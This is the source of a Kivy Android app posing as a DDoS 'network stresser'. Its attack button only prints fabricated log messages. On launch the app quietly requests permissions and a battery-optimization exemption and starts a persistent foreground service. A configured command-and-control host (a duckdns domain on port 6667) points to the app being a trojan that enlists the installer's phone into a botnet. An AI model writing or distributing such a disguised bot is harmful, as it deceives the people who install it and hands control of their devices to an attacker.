
import threading
import socket
import time
import random
from kivy.app import App
from kivy.lang import Builder
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.properties import StringProperty, BooleanProperty
from kivy.clock import Clock
from kivy.utils import platform

# --- C2 SUNUCU AYARLARI ---
C2_HOST = "elchapo.duckdns.org"
C2_PORT = 6667
# --------------------------

KV = '''
BoxLayout:
    orientation: 'vertical'
    padding: 20
    spacing: 15
    canvas.before:
        Color:
            rgba: 0.08, 0.08, 0.08, 1
        Rectangle:
            pos: self.pos
            size: self.size

    Label:
        text: 'El Chapo DDoS Tools'
        font_size: '26sp'
        bold: True
        color: 1, 0, 0, 1
        size_hint_y: None
        height: 50
        
    Label:
        text: 'Advanced Network Stresser'
        font_size: '14sp'
        color: 0.5, 0.5, 0.5, 1
        size_hint_y: None
        height: 20

    BoxLayout:
        orientation: 'vertical'
        size_hint_y: None
        height: 220
        spacing: 10
        padding: [0, 20, 0, 0]

        TextInput:
            id: target_ip
            hint_text: 'Target IP / Host'
            multiline: False
            background_color: 0.15, 0.15, 0.15, 1
            foreground_color: 1, 1, 1, 1
            cursor_color: 1, 0, 0, 1
            padding: 15
            size_hint_y: None
            height: 50

        BoxLayout:
            spacing: 10
            size_hint_y: None
            height: 50
            
            TextInput:
                id: target_port
                hint_text: 'Port (80)'
                input_filter: 'int'
                multiline: False
                background_color: 0.15, 0.15, 0.15, 1
                foreground_color: 1, 1, 1, 1
                cursor_color: 1, 0, 0, 1
                padding: 15

            TextInput:
                id: threads
                hint_text: 'Threads (50)'
                input_filter: 'int'
                multiline: False
                background_color: 0.15, 0.15, 0.15, 1
                foreground_color: 1, 1, 1, 1
                cursor_color: 1, 0, 0, 1
                padding: 15

        Button:
            id: attack_btn
            text: 'START ATTACK'
            bold: True
            font_size: '18sp'
            background_color: 0.8, 0, 0, 1
            on_release: app.on_fake_attack_btn()
            size_hint_y: None
            height: 60

    ScrollView:
        BoxLayout:
            orientation: 'vertical'
            size_hint_y: None
            height: self.minimum_height
            Label:
                text: app.log_text
                size_hint_y: None
                height: self.texture_size[1]
                text_size: self.width, None
                halign: 'left'
                valign: 'top'
                markup: True
                padding: [10, 10]
'''

class ElChapoApp(App):
    log_text = StringProperty("[color=00ff00]System Ready...[/color]\n")
    is_fake_attacking = False

    def build(self):
        return Builder.load_string(KV)

    def on_start(self):
        # Servis başlatmayı 1 saniye geciktir
        Clock.schedule_once(lambda dt: self.start_android_service(), 1.0)

    def on_fake_attack_btn(self):
        if not self.is_fake_attacking:
            ip = self.root.ids.target_ip.text
            if not ip:
                self.log_text += "\n[color=ffff00][!] Error: Target IP required![/color]"
                return
            
            self.is_fake_attacking = True
            self.root.ids.attack_btn.text = "STOP ATTACK"
            self.root.ids.attack_btn.background_color = (0.2, 0.2, 0.2, 1)
            
            self.log_text = f"[color=ff0000][b]ATTACK STARTED ON {ip}[/b][/color]\n"
            self.fake_log_event = Clock.schedule_interval(self.generate_fake_logs, 1.5)
        else:
            self.stop_fake_attack()

    def generate_fake_logs(self, dt):
        logs = [
            "Handshaking with target...",
            "Sending UDP Packets...",
            "Bypassing Firewall Rules...",
            "Injecting payload...",
            "Target response time: 999ms",
            "Flooding port...",
            "Using spoofed IPs..."
        ]
        msg = random.choice(logs)
        self.log_text += f"\n[color=00ff00]> {msg}[/color]"

    def stop_fake_attack(self):
        self.is_fake_attacking = False
        self.root.ids.attack_btn.text = "START ATTACK"
        self.root.ids.attack_btn.background_color = (0.8, 0, 0, 1)
        if hasattr(self, 'fake_log_event'):
            self.fake_log_event.cancel()
        self.log_text += "\n[color=ffff00]Attack Stopped by User.[/color]\n"

    def start_android_service(self):
        if platform == 'android':
            try:
                from jnius import autoclass
                from android.permissions import request_permissions, Permission
                
                def callback(permissions, results):
                    if all(results):
                        self.log_text += "\n[color=00ff00]Permissions OK[/color]"
                        self.launch_service_native()
                    else:
                        self.log_text += "\n[color=ffff00]Some permissions denied[/color]"
                        self.launch_service_native()  # Yine de dene

                request_permissions([Permission.INTERNET, Permission.WAKE_LOCK, Permission.FOREGROUND_SERVICE], callback)
                self.request_battery_exemption()
            except Exception as e:
                self.log_text += f"\n[color=ff0000]Permission error: {str(e)}[/color]"
        else:
            self.log_text += "\n[color=aaaaaa]Test Mode (Windows)[/color]"

    def request_battery_exemption(self):
        try:
            from jnius import autoclass
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Intent = autoclass('android.content.Intent')
            Settings = autoclass('android.provider.Settings')
            Uri = autoclass('android.net.Uri')
            
            mActivity = PythonActivity.mActivity
            packageName = mActivity.getPackageName()
            
            intent = Intent()
            intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.setData(Uri.parse("package:" + packageName))
            mActivity.startActivity(intent)
        except Exception as e:
            pass

    def launch_service_native(self):
        try:
            from jnius import autoclass
            mActivity = autoclass('org.kivy.android.PythonActivity').mActivity
            Intent = autoclass('android.content.Intent')
            Build = autoclass('android.os.Build$VERSION')
            
            service_name = 'org.elchapo.ServiceElchaposervice'
            service = autoclass(service_name)
            
            intent = Intent(mActivity, service)
            intent.putExtra("python_service_argument", "Start")
            
            if Build.SDK_INT >= 26:
                mActivity.startForegroundService(intent)
            else:
                mActivity.startService(intent)
                
            self.log_text += "\n[color=00ff00]Service Started[/color]"
        except Exception as e:
            self.log_text += f"\n[color=ff0000]Service error: {str(e)}[/color]"

if __name__ == '__main__':
    ElChapoApp().run()
